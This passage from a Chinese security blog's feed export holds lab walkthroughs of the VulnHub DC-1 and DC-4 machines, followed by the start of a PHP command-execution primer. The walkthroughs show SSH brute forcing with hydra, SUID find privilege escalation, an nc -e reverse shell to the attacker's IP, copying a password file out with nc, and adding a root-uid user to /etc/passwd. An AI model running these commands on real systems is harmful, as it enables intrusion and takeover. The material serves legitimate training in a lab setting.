<p>提示下一步：<a href="https://www.cnblogs.com/davis12/p/14373311.html">passwd</a>和<a href="http://c.biancheng.net/view/840.html">shadow</a>，还有<code>perms</code>、<code>find</code>、<code>-exec</code>这些都是提权用的。</p>
<h2 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h2><p>查看passwd文件，发现flag4用户</p>
<img src="/2022/04/07/VulnHub-DC-1/image-20220407024421092.png" class="" title="image-20220407024421092" loading="lazy">

<p>进入该用户目录下，发现<code>flag4.txt</code>，尝试读取发现无权限。</p>
<p><a href="http://www.ha97.com/5186.html">hydra</a>爆破<code>flag4</code>用户密码。</p>
<p>靶机已开启22端口的ssh服务，可以尝试暴力破解密码</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">sudo</span> hydra -l flag4 -P /usr/share/wordlists/rockyou.txt.gz <span class="token number">192.168</span>.254.129 <span class="token function">ssh</span>
或者
$ <span class="token function">sudo</span> hydra -l flag4 -P /usr/share/wordlists/rockyou.txt.gz ssh://192.168.254.129

-l  指定破解的用户
-P  指定密码字典
ssh://ip 指定使用协议和ip地址</code></pre>

<img src="/2022/04/07/VulnHub-DC-1/image-20220407103850408.png" class="" title="image-20220407103850408" loading="lazy">

<p>登录靶机</p>
<img src="/2022/04/07/VulnHub-DC-1/image-20220407103939911.png" class="" title="image-20220407103939911" loading="lazy">

<p>也可以kali远程连接</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">ssh</span> flag4@192.168.254.129</code></pre>

<img src="/2022/04/07/VulnHub-DC-1/image-20220407104141383.png" class="" title="image-20220407104141383" loading="lazy">

<p>成功拿到<code>flag4</code></p>
<blockquote>
<p>Can you use this same method to find or access the flag in root?</p>
<p>Probably. But perhaps it’s not that easy. Or maybe it is?</p>
</blockquote>
<p>根据flag3和flag4可知需要root权限。</p>
<h2 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h2><p>利用<a href="https://www.freebuf.com/articles/web/272617.html">suid提权</a>。</p>
<blockquote>
<p>SUID可以让调用者以文件拥有者的身份运行该文件，所以我们利用SUID提权的思路就是运行root用户所拥有的SUID的文件，那么我们运行该文件的时候就得获得root用户的身份了。</p>
</blockquote>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#查找具有root权限的SUID的文件</span>
$ <span class="token function">find</span> / -perm -u<span class="token operator">=</span>s -type f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null</code></pre>

<blockquote>
<p>-perm 是代表按指定权限搜索</p>
<p>-u&#x3D;s 其中u代表当前用户的权限，s 代表 suid 权限，- 号代表至少需要满足指定的权限，可以有更多的权限，但是不能少了这个指定权限</p>
<p>-tpye 代表搜索指定的类型，f代表文件</p>
<p>2&gt;&#x2F;dev&#x2F;null 代表将不显示错误信息</p>
</blockquote>
<img src="/2022/04/07/VulnHub-DC-1/image-20220407104842350.png" class="" title="image-20220407104842350" loading="lazy">

<p>可以看到这些命令都可以以root权限运行，这里用find。</p>
<p>如果find以SUID权限运行，所有通过find执行的命令都会以root权限运行。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">touch</span> nayst
<span class="token comment">#查找当前目录下名为nayst的文件并执行shell</span>
$ <span class="token function">find</span> ./ -name nayst -exec <span class="token string">"/bin/sh"</span> <span class="token punctuation">\</span><span class="token punctuation">;</span>

<span class="token comment">#-exec 参数后面跟的是command命令，它的终止是以;为结束标志的，所以这句命令后面的分号是不可缺少的，考虑到各个系统中分号会有不同的意义，所以在分号前面加反斜杠。</span></code></pre>

<img src="/2022/04/07/VulnHub-DC-1/image-20220407105131125.png" class="" title="image-20220407105131125" loading="lazy">

<p>成功拿到root权限！</p>
<img src="/2022/04/07/VulnHub-DC-1/image-20220407105231494.png" class="" title="image-20220407105231494" loading="lazy">

<p>成功拿到最后的flag！</p>
<blockquote>
<p>Well done!!!!</p>
<p>Hopefully you’ve enjoyed this and learned some new skills.</p>
<p>You can let me know what you thought of this little journey<br>by contacting me via Twitter - @DCAU7</p>
</blockquote>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h2 id="学到的方法"><a href="#学到的方法" class="headerlink" title="学到的方法"></a>学到的方法</h2><ol>
<li><code>arp-scan</code>、<code>netdiscover</code>扫描存活主机。</li>
<li><a href="http://sh1yan.top/2019/07/28/MSF-Command-Notes/">MSF常用指令</a>。</li>
<li><a href="http://www.ha97.com/5186.html">hydra</a>爆破ssh密码。</li>
<li><a href="https://www.cnblogs.com/zaqzzz/p/12075132.html#1suid%E6%8F%90%E6%9D%83">suid提权</a>。</li>
</ol>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.extrader.top/posts/5787bcec/#">VulnHub-DC-1靶场练习</a></p>
<p><a href="https://www.jianshu.com/p/86b3c598a4c4">Vulnhub靶机渗透测试——DC-1</a></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>靶场</tag>
      </tags>
  </entry>
  <entry>
    <title>VulnHub-DC-4</title>
    <url>/2022/04/10/VulnHub-DC-4/</url>
    <content><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>在VMware中搭建环境，网络选择NAT或者桥接，确保攻击机和靶机在同一网络下即可，我这里选择的NAT。</p>
<p>靶机：192.168.254.132（<a href="https://www.vulnhub.com/entry/dc-4,313//">DC-4</a>）</p>
<p>攻击机：192.168.254.128（Kali）</p>
<p>物理机：192.168.254.1（Windows10）</p>
<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><h2 id="网络扫描"><a href="#网络扫描" class="headerlink" title="网络扫描"></a>网络扫描</h2><p>扫描靶机IP</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">node</span> -sn <span class="token number">192.168254</span>.1/24</code></pre>

<img src="/2022/04/10/VulnHub-DC-4/image-20220411135302682.png" class="" title="image-20220411135302682" loading="lazy">

<p>扫描开放的端口和服务</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ nmap -sV -p- <span class="token number">192.168</span>.254.132</code></pre>

<img src="/2022/04/10/VulnHub-DC-4/image-20220411135723772.png" class="" title="image-20220411135723772" loading="lazy">

<p>靶机开放了80端口和22端口，80端口存在httpd服务</p>
<h2 id="查看相关信息"><a href="#查看相关信息" class="headerlink" title="查看相关信息"></a>查看相关信息</h2><p>打开站点，一个登录框，查看插件及代码，未发现任何信息。</p>
<img src="/2022/04/10/VulnHub-DC-4/image-20220411135908583.png" class="" title="image-20220411135908583" loading="lazy">

<h1 id="漏洞查找及利用"><a href="#漏洞查找及利用" class="headerlink" title="漏洞查找及利用"></a>漏洞查找及利用</h1><p>尝试使用<code>burp</code>爆破登录账户。</p>
<p>先抓登录的包，发送到爆破模，选择密码字段。</p>
<img src="/2022/04/10/VulnHub-DC-4/image-20220411141922974.png" class="" title="image-20220411141922974" loading="lazy">

<p>选择字典，开始爆破。</p>
<p>Kali上的burp是社区版，不支持多线程爆破，直接在物理机上爆了。</p>
<img src="/2022/04/10/VulnHub-DC-4/image-20220411143028862.png" class="" title="image-20220411143028862" loading="lazy">

<p>可以看到718长度对应的请求是成功登录了的，未登录成功的都是557，顺利拿到密码 <code>happy</code>。</p>
<p>尝试登录，发现被重定向了，这里抓包重放。</p>
<img src="/2022/04/10/VulnHub-DC-4/image-20220411143545865.png" class="" title="image-20220411143545865" loading="lazy">

<p>可以看到登录成功，进入<code>/login.php</code>，可以看到成功登录了。</p>
<img src="/2022/04/10/VulnHub-DC-4/image-20220411143941630.png" class="" title="image-20220411143941630" loading="lazy">

<p>存在<code>command</code>业务，有三个选项，随便测试一下，可以看到执行了命令，且命令可控。</p>
<img src="/2022/04/10/VulnHub-DC-4/image-20220411144737779.png" class="" title="image-20220411144737779" loading="lazy">

<p>接下来就是抓包，改命令，反弹shell。</p>
<p>首先监听端口。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">nc</span> -lvnp <span class="token number">8888</span></code></pre>

<p>改包执行命令。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">nc</span> -e /bin/bash <span class="token number">192.168</span>.254.128 <span class="token number">8888</span></code></pre>

<p>成功反弹shell！</p>
<img src="/2022/04/10/VulnHub-DC-4/image-20220411145218039.png" class="" title="image-20220411145218039" loading="lazy">

<h1 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h1><p>先拿到交互式的shell</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ python -c <span class="token string">'import pty;pty.spawn("/bin/bash")'</span></code></pre>

<p>寻找敏感文件</p>
<p>发现三个用户</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">ls</span> /home</code></pre>

<img src="/2022/04/10/VulnHub-DC-4/image-20220419164650819.png" class="" title="image-20220419164650819" loading="lazy">

<p>在 <code>jim</code> 用户目录下发现可疑文件</p>
<img src="/2022/04/10/VulnHub-DC-4/image-20220419170844431.png" class="" title="image-20220419170844431" loading="lazy">

<p>打开发现是密码本</p>
<img src="/2022/04/10/VulnHub-DC-4/image-20220419171340431.png" class="" title="image-20220419171340431" loading="lazy">

<p>复制到本地爆破登录密码</p>
<p>先监听端口</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">nc</span> -lvnp <span class="token number">4445</span> <span class="token operator">></span> pass.txt</code></pre>

<img src="/2022/04/10/VulnHub-DC-4/image-20220419171423660.png" class="" title="image-20220419171423660" loading="lazy">

<p>发到这个端口上</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">nc</span> <span class="token number">192.168</span>.254.128 <span class="token number">4445</span> <span class="token operator">&lt;</span> old-passwords.bak</code></pre>

<img src="/2022/04/10/VulnHub-DC-4/image-20220419171519103.png" class="" title="image-20220419171519103" loading="lazy">

<p>爆破</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ hydra -l jim -P /home/nayst/pass.txt <span class="token number">192.168</span>.254.132 <span class="token function">ssh</span></code></pre>

<img src="/2022/04/10/VulnHub-DC-4/image-20220419171842389.png" class="" title="image-20220419171842389" loading="lazy">

<p>成功拿到密码：<code>jibril04</code></p>
<p>登录<code>jim</code>账户，提示有邮件未查看。</p>
<img src="/2022/04/10/VulnHub-DC-4/image-20220419172743305.png" class="" title="image-20220419172743305" loading="lazy">

<p>找到邮件。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">find</span> / -name mail</code></pre>

<img src="/2022/04/10/VulnHub-DC-4/image-20220419173012139.png" class="" title="image-20220419173012139" loading="lazy">

<p>两个地址都是一样的。</p>
<p>进入目录发现有一封邮件。</p>
<img src="/2022/04/10/VulnHub-DC-4/image-20220419173104256.png" class="" title="image-20220419173104256" loading="lazy">

<p>信里可以看到<code>charles</code>把密码发过来了，<code>^xHhA&amp;hvim0y</code>，直接登录。</p>
<img src="/2022/04/10/VulnHub-DC-4/image-20220419181741267.png" class="" title="image-20220419181741267" loading="lazy">

<p>成功登录！尝试提权。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">find</span> / -perm -u<span class="token operator">=</span>s -type f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null</code></pre>

<img src="/2022/04/10/VulnHub-DC-4/image-20220419181912748.png" class="" title="image-20220419181912748" loading="lazy">

<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">sudo</span> -l</code></pre>

<img src="/2022/04/10/VulnHub-DC-4/image-20220419181939448.png" class="" title="image-20220419181939448" loading="lazy">

<p>利用<code>teehee</code>，往<code>/etc/passwd</code>内追加一条<strong>id为0（即管理员身份）的用户</strong>。</p>
<blockquote>
<p>root: x :0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</p>
<p>字段1： 用户名。</p>
<p>字段2：密码占位符，x代表有密码。</p>
<p>字段3：用户的uid，如果一个用户uid为0则表示该用户超级管理员。</p>
<p>字段4：用户的gid，也就是所属用户组的id。</p>
<p>字段5：用户信息（弃用）。</p>
<p>字段6：用户家目录。</p>
<p>字段7：用户登陆系统后使用的shell。</p>
</blockquote>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">echo</span> <span class="token string">"nayst::0:0:::/bin/bash"</span> <span class="token operator">|</span> <span class="token function">sudo</span> teehee -a /etc/passwd</code></pre>

<p>因为此用户无密码，直接切换即可</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">su</span> nayst</code></pre>

<img src="/2022/04/10/VulnHub-DC-4/image-20220419182331430.png" class="" title="image-20220419182331430" loading="lazy">

<p>成功拿到flag！</p>
<img src="/2022/04/10/VulnHub-DC-4/image-20220419182503778.png" class="" title="image-20220419182503778" loading="lazy">

<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h2 id="学到的知识点"><a href="#学到的知识点" class="headerlink" title="学到的知识点"></a>学到的知识点</h2><ol>
<li>利用 <code>nc</code> 复制文件。</li>
<li><code>teehee</code>提权。</li>
</ol>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/rpsate/article/details/119738073?spm=1001.2014.3001.5502">vulnhub DC4 靶场练习</a></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>靶场</tag>
      </tags>
  </entry>
  <entry>
    <title>命令执行-PHP</title>
    <url>/2021/07/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<h1 id="什么是命令执行漏洞"><a href="#什么是命令执行漏洞" class="headerlink" title="什么是命令执行漏洞"></a>什么是命令执行漏洞</h1><p>命令执行漏洞，就是指用户通过浏览器或其他辅助程序提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令。</p>
<p>用户可以在命令执行函数内直接调用<strong>操作系统命令</strong>。</p>
<p>以下内容默认为在PHP中。</p>
<h1 id="常见的命令执行函数"><a href="#常见的命令执行函数" class="headerlink" title="常见的命令执行函数"></a>常见的命令执行函数</h1><h2 id="system"><a href="#system" class="headerlink" title="system"></a>system</h2><ul>
<li>简介</li>
</ul>
<p>执行一个外部函数，并显示输出</p>
<ul>
<li>语法</li>
</ul>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token function">system</span><span class="token punctuation">(</span><span class="token keyword type-hint">string</span> <span class="token variable">$command</span><span class="token punctuation">,</span> <span class="token keyword type-declaration">int</span> <span class="token operator">&amp;</span><span class="token variable">$return_var</span> <span class="token operator">=</span> <span class="token operator">?</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span></code></pre>

<ul>
<li>参数</li>
</ul>
<p><strong>conmand</strong>：要执行的命令</p>
<p><strong>return_var</strong>：如果提供此参数，则外部命令执行后的返回状态会被设置到此变量中</p>
<ul>
<li>返回值</li>
</ul>
<p>成功则返回命令输出的最后一行，失败则返回false</p>
<ul>
<li>例子</li>
</ul>
<h2 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h2><ul>
<li>简介</li>
</ul>
<p>执行一个外部程序</p>
<ul>
<li>语法</li>
</ul>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token function">exec</span><span class="token punctuation">(</span><span class="token keyword type-hint">string</span> <span class="token variable">$command</span><span class="token punctuation">,</span> <span class="token keyword type-declaration">array</span> <span class="token operator">&amp;</span><span class="token variable">$output</span> <span class="token operator">=</span> <span class="token operator">?</span><span class="token punctuation">,</span> <span class="token keyword type-declaration">int</span> <span class="token operator">&amp;</span><span class="token variable">$return_var</span> <span class="token operator">=</span> <span class="token operator">?</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span></code></pre>

<ul>
<li>参数</li>
</ul>
<p><strong>command</strong>：要执行的命令</p>
<p><strong>output</strong>：如果执行此参数，那么会用命令执行的输出填充此数组，每行输出填充数组中的一个元素，数据中不包含行尾的空白字符，例如<code>\n</code>字符。如果数组中已经包含了部分元素，exec()函数会在此数组末尾进行追加。</p>
<p><strong>return_var</strong>：如果同时提供<strong>output</strong>和次参数，命令执行后的状态会被写入到此变量</p>
<ul>
<li>返回值</li>
</ul>
<p>命令执行结果的最后一行内容</p>
<ul>
<li>例子</li>
</ul>
<h2 id="popen"><a href="#popen" class="headerlink" title="popen"></a>popen</h2><ul>
<li>简介</li>
</ul>
<p>打开一个指向进程的管道，该进程由派生给定的command命令执行而产生</p>
<ul>
<li>语法</li>
</ul>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token function">popen</span><span class="token punctuation">(</span><span class="token keyword type-hint">string</span> <span class="token variable">$command</span><span class="token punctuation">,</span> <span class="token keyword type-hint">string</span> <span class="token variable">$mode</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token class-name return-type">resource</span></code></pre>

<ul>
<li>参数</li>
</ul>
<p><strong>command</strong>：命令</p>
<p><strong>mode</strong>：模式。</p>
<p><code>r</code>：只读</p>
<p><code>w</code>：只写（打开并清空已有文件或创建一个新文件）</p>
<ul>
<li>返回值</li>
</ul>
<p>返回一个和<code>popen()</code>所返回的相同的文件指针，只不过它是单向的（只能用于读和写）并且必须用<code>pclose()</code>来关闭，此指针可以用于<code>fgets()</code>、<code>fgetss()</code>和<code>fwrite()</code>。当模式为<code>r</code>时，返回的文件指针等于命令的 STDOUT，当模式为 <code>w</code>，返回的文件指针等于命令的 STDIN。</p>
<ul>
<li>例子</li>
</ul>
<h2 id="passthru"><a href="#passthru" class="headerlink" title="passthru"></a>passthru</h2><ul>
<li>简介</li>
</ul>
<p>执行外部程序并显示原始输出</p>
<ul>
<li>语法</li>
</ul>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token function">passthru</span><span class="token punctuation">(</span><span class="token keyword type-hint">string</span> <span class="token variable">$command</span><span class="token punctuation">,</span> <span class="token keyword type-declaration">int</span> <span class="token operator">&amp;</span><span class="token variable">$return_var</span> <span class="token operator">=</span> <span class="token operator">?</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">void</span></code></pre>

<ul>
<li>参数</li>
</ul>
<p><strong>command</strong>：要执行的命令</p>
<p><strong>return_var</strong>：如果提供此参数，Unix命令的返回状态会被记录到此参数</p>
<ul>
<li>返回值</li>
</ul>
<p>无返回值</p>
<ul>
<li>例子</li>
</ul>
<h2 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec"></a>shell_exec</h2><ul>
<li>简介</li>
</ul>
<p>通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回</p>
<ul>
<li>语法</li>
</ul>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token keyword type-hint">string</span> <span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span></code></pre>

<ul>
<li>参数</li>
</ul>
<p><strong>cmd</strong>：要执行的命令</p>
<ul>
<li>返回值</li>
</ul>
<p>命令执行的输出，错误或无输出时返回null</p>
<ul>
<li>例子</li>
</ul>
<h2 id="执行运算符（-96-）"><a href="#执行运算符（-96-）" class="headerlink" title="执行运算符（&#96;）"></a>执行运算符（&#96;）</h2><ul>
<li>简介</li>
</ul>
<p>PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回（即，可以赋给一个变量而不是简单地丢弃到标准输出），效果与函数<strong>shell_exec</strong>相同</p>
<h1 id="常见的代码执行函数"><a href="#常见的代码执行函数" class="headerlink" title="常见的代码执行函数"></a>常见的代码执行函数</h1><h2 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h2><ul>
<li>简介</li>
</ul>
<p>把字符串作为PHP代码执行，该字符串必须是合法的，且以分号结尾</p>
<ul>
<li>语法</li>
</ul>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token keyword type-hint">string</span> <span class="token variable">$code</span><span class="token punctuation">)</span></code></pre>

<ul>
<li>参数</li>
</ul>
<p><strong>code</strong>：需要被执行的字符串</p>
<ul>
<li>示例</li>
</ul>
<img src="/2021/07/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20210721164650468.png" class="" loading="lazy">

<h2 id="assert"><a href="#assert" class="headerlink" title="assert"></a>assert</h2><ul>
<li>简介</li>
</ul>
<p>检查一个<a href="https://www.php.cn/php-ask-429607.html">断言</a>是否为FALSE</p>
<ul>
<li>语法</li>
</ul>
<p><strong>PHP5</strong></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token function">assert</span><span class="token punctuation">(</span><span class="token keyword type-hint">mixed</span> <span class="token variable">$assertion</span><span class="token punctuation">,</span> <span class="token keyword type-hint">string</span> <span class="token variable">$description</span> <span class="token operator">=</span> <span class="token operator">?</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">bool</span></code></pre>

<p><strong>PHP7</strong></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token function">assert</span><span class="token punctuation">(</span><span class="token keyword type-hint">mixed</span> <span class="token variable">$assertion</span><span class="token punctuation">,</span> <span class="token class-name type-declaration">Throwable</span> <span class="token variable">$exception</span> <span class="token operator">=</span> <span class="token operator">?</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">bool</span></code></pre>

<p><strong>assert()</strong> 会检查指定的 <code>assertion</code> 并在结果为 <code>false</code>时采取适当的行动。</p>
<ul>
<li>参数</li>
</ul>
<p><strong>assertion</strong>：断言</p>
<p><strong>description</strong>：如果 <code>assertion</code> 失败了，选项 description 将会包括在失败信息里</p>
<ul>
<li>示例</li>
</ul>
<img src="/2021/07/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20210721165631626.png" class="" loading="lazy">

<h2 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func"></a>call_user_func</h2><ul>
<li>简介</li>
</ul>
<p>把第一个参数作为回调函数调用</p>
<ul>
<li>语法</li>
</ul>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token keyword type-hint">callable</span> <span class="token variable">$callback</span><span class="token punctuation">,</span> <span class="token keyword type-hint">mixed</span> <span class="token variable">$parameter</span> <span class="token operator">=</span> <span class="token operator">?</span><span class="token punctuation">,</span> <span class="token keyword type-hint">mixed</span> $<span class="token operator">...</span> <span class="token operator">=</span> <span class="token operator">?</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">mixed</span></code></pre>

<p>第一个参数 <code>callback</code> 是被调用的回调函数，其余参数是回调函数的参数。</p>
<ul>
<li>参数</li>
</ul>
<p><strong>callback</strong>：将被调用的回调函数</p>
<p><strong>parameter</strong>：0个或以上的参数，被传入回调函数。</p>
<ul>
<li>示例</li>
</ul>
<img src="/2021/07/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20210721192520452.png" class="" loading="lazy">

<h2 id="call-user-func-array"><a href="#call-user-func-array" class="headerlink" title="call_user_func_array"></a>call_user_func_array</h2><ul>
<li>简介</li>
</ul>
<p>调用回调函数，并把一个数组参数作为回调函数的参数</p>
<ul>
<li>语法</li>
</ul>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token keyword type-hint">callable</span> <span class="token variable">$callback</span><span class="token punctuation">,</span> <span class="token keyword type-hint">array</span> <span class="token variable">$param_arr</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">mixed</span></code></pre>

<ul>
<li>参数</li>
</ul>
<p><strong>callback</strong>：被调用的回调函数。</p>
<p><strong>param_arr</strong>：要被传入回调函数的数组，这个数组得是索引数组。</p>
<ul>
<li>示例</li>
</ul>
<img src="/2021/07/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20210721194104204.png" class="" loading="lazy">

<h2 id="create-function"><a href="#create-function" class="headerlink" title="create_function"></a>create_function</h2><ul>
<li>简介</li>
</ul>
<p>根据传递的参数创建匿名函数，并为该匿名函数返回唯一名称。</p>
<ul>
<li>语法</li>
</ul>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token function">create_function</span><span class="token punctuation">(</span><span class="token keyword type-hint">string</span> <span class="token variable">$args</span><span class="token punctuation">,</span> <span class="token keyword type-hint">string</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span></code></pre>

<ul>
<li>参数</li>
</ul>
<p><strong>args</strong>：被调用函数的参数</p>
<p><strong>code</strong>：被调用的函数的代码</p>
<ul>
<li>示例</li>
</ul>
<p>在<strong>code</strong>处存在漏洞，闭合前面语句注释后面语句，中间可以执行任意指令。</p>
<img src="/2021/07/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20210721195307551.png" class="" loading="lazy">

<h2 id="array-map"><a href="#array-map" class="headerlink" title="array_map"></a>array_map</h2><ul>
<li>简介</li>
</ul>
<p>遍历数组，为每个数组的每个元素应用回调函数。</p>
<ul>
<li>语法</li>
</ul>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token function">array_map</span><span class="token punctuation">(</span><span class="token keyword type-hint">callable</span> <span class="token variable">$callback</span><span class="token punctuation">,</span> <span class="token keyword type-hint">array</span> <span class="token variable">$array</span><span class="token punctuation">,</span> <span class="token keyword type-declaration">array</span> <span class="token operator">...</span><span class="token variable">$arrays</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">array</span></code></pre>

<ul>
<li>参数</li>
</ul>
<p><strong>callback</strong>：回调函数</p>
<p><strong>array</strong>：需要便利的数组</p>
<p><strong>arrays</strong>：额外的数组</p>
<ul>
<li>示例</li>
</ul>
<img src="/2021/07/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20210721195824158.png" class="" loading="lazy">

<h2 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace"></a>preg_replace</h2><ul>
<li>简介</li>
</ul>
<p>执行一个正则表达式的搜索和替换</p>
<p>Warning：此函数被移除于<strong>PHP7.0.0</strong></p>
<ul>
<li>语法</li>
</ul>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token function">preg_replace</span><span class="token punctuation">(</span>
    <span class="token keyword type-declaration">string</span><span class="token operator">|</span><span class="token keyword type-declaration">array</span> <span class="token variable">$pattern</span><span class="token punctuation">,</span>
    <span class="token keyword type-declaration">string</span><span class="token operator">|</span><span class="token keyword type-declaration">array</span> <span class="token variable">$replacement</span><span class="token punctuation">,</span>
    <span class="token keyword type-declaration">string</span><span class="token operator">|</span><span class="token keyword type-declaration">array</span> <span class="token variable">$subject</span><span class="token punctuation">,</span>
    <span class="token keyword type-hint">int</span> <span class="token variable">$limit</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span>
    <span class="token keyword type-declaration">int</span> <span class="token operator">&amp;</span><span class="token variable">$count</span> <span class="token operator">=</span> <span class="token constant">null</span>
<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span class="token operator">|</span><span class="token keyword type-declaration">array</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span></code></pre>

<ul>
<li>参数</li>
</ul>
<p><strong>pattern</strong>：要搜索的模式，可以是一个字符串或字符串数组</p>
<p><strong>replacement</strong>：用于替换的字符串或字符串数组</p>
<p><strong>subject</strong>：要搜索的和替换的字符串或字符串数组</p>
<p><strong>limit</strong>：每个模式在每个 <code>subject</code> 上进行替换的最大次数。默认是 <code>-1</code>(无限)。</p>
<p><strong>count</strong>：如果指定，将会被填充为完成的替换次数。</p>
<p>搜索 <code>subject</code> 中匹配 <code>pattern</code> 的部分，以 <code>replacement</code> 进行替换。</p>
<ul>
<li>示例</li>
</ul>
<p>此函数存在模式修饰符，其中，修饰符e会让函数对替换字符串进行后向引用替换之后，将替换后的字符串作为PHP代码评估执行（以eval函数方式），并使用执行结果作为实际参与替换的字符串</p>
<img src="/2021/07/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20210721202420938.png" class="" loading="lazy">

<h1 id="Windows下的命令连接符"><a href="#Windows下的命令连接符" class="headerlink" title="Windows下的命令连接符"></a>Windows下的命令连接符</h1><p>Windows下的命令连接符包括<code>&amp;</code>、<code>&amp;&amp;</code>、<code>|</code>、<code>||</code>。</p>
<h2 id="amp"><a href="#amp" class="headerlink" title="&amp;"></a>&amp;</h2><ul>
<li><code>&amp;</code>前面的语句为假，则直接执行&amp;后面的语句</li>
</ul>
<img src="/2021/07/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20210720195045788.png" class="" loading="lazy">

<ul>
<li><code>&amp;</code>前面的语句为真，则前后语句都执行</li>
</ul>
<img src="/2021/07/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20210720195238225.png" class="" loading="lazy">

<h2 id="amp-amp"><a href="#amp-amp" class="headerlink" title="&amp;&amp;"></a>&amp;&amp;</h2><ul>
<li><code>&amp;&amp;</code>前面的语句为假，则直接报错，后面的语句不执行</li>
</ul>
<img src="/2021/07/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20210720195517185.png" class="" loading="lazy">

<ul>
<li><code>&amp;&amp;</code>前面的语句为真，前后语句都执行</li>
</ul>
<img src="/2021/07/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20210720195549577.png" class="" loading="lazy">

<h2 id=""><a href="#" class="headerlink" title="|"></a>|</h2><ul>
